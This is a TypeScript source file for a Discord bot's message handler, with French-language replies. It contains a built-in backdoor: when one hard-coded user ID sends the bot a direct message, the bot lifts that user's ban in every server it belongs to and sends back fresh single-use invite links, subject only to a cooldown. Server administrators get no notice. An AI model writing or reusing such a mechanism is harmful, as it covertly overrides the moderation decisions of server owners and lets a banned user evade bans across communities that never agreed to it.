import { Events, Message, TextChannel, GuildBasedChannel } from 'discord.js';
import { JsonDatabase } from '../database/JsonDatabase';
import { Config } from '../config';
import { checkMessage } from '../commands/trollus/factchecker';

export const event = {
    name: Events.MessageCreate,
    async execute(message: Message) {
        await checkMessage(message);

        if (!message.guild && message.author.id === Config.unban.userId) {
            const db = await JsonDatabase.getInstance();
            const lastUnban = await db.getUnbanCooldown();
            const now = Date.now();
            const cooldownRemaining = lastUnban + Config.unban.cooldown - now;

            if (cooldownRemaining > 0) {
                const minutes = Math.ceil(cooldownRemaining / (60 * 1000));
                await message.reply(
                    `Tu dois attendre encore ${minutes} minute${minutes > 1 ? 's' : ''} avant de pouvoir te débannir à nouveau.`
                );
                return;
            }

            try {
                await db.updateUnbanCooldown();

                const guilds = message.client.guilds.cache;
                let successCount = 0;
                let failCount = 0;
                const inviteLinks: string[] = [];

                for (const [, guild] of guilds) {
                    try {
                        const ban = await guild.bans.fetch(message.author.id).catch(() => null);
                        if (ban) {
                            await guild.bans.remove(message.author.id, 'Auto-unban via DM');

                            const channel = guild.channels.cache
                                .filter((c): c is TextChannel => c.isTextBased() && !c.isThread())
                                .find(c => c.permissionsFor(guild.members.me!)?.has('CreateInstantInvite'));

                            if (channel) {
                                const invite = await channel.createInvite({
                                    maxAge: 7 * 24 * 60 * 60, // 7 jours
                                    maxUses: 1,
                                    unique: true,
                                    reason: 'Auto-unban invite'
                                }).catch(() => null);

                                if (invite) {
                                    await db.setInviteLink(guild.id, invite.url);
                                    inviteLinks.push(`${guild.name}: ${invite.url}`);
                                }
                            }

                            successCount++;
                        }
                    } catch (error) {
                        console.error(`Erreur lors du débannissement de ${guild.name}:`, error);
                        failCount++;
                    }
                }
                let response = `Débannissement terminé !\n`;
                if (successCount > 0) {
                    response += `✅ Débanni de ${successCount} serveur${successCount > 1 ? 's' : ''}\n`;
                    if (inviteLinks.length > 0) {
                        response += `\nInvitations :\n${inviteLinks.join('\n')}`;
                    }
                } else {
                    response += `❌ Tu n'es banni d'aucun serveur où je suis présent.`;
                }
                if (failCount > 0) {
                    response += `\n⚠️ Échec pour ${failCount} serveur${failCount > 1 ? 's' : ''}.`;
                }

                await message.reply(response);

            } catch (error) {
                console.error('Erreur lors du débannissement:', error);
                await message.reply('Une erreur est survenue lors du débannissement.');
            }
        }
    }
}; 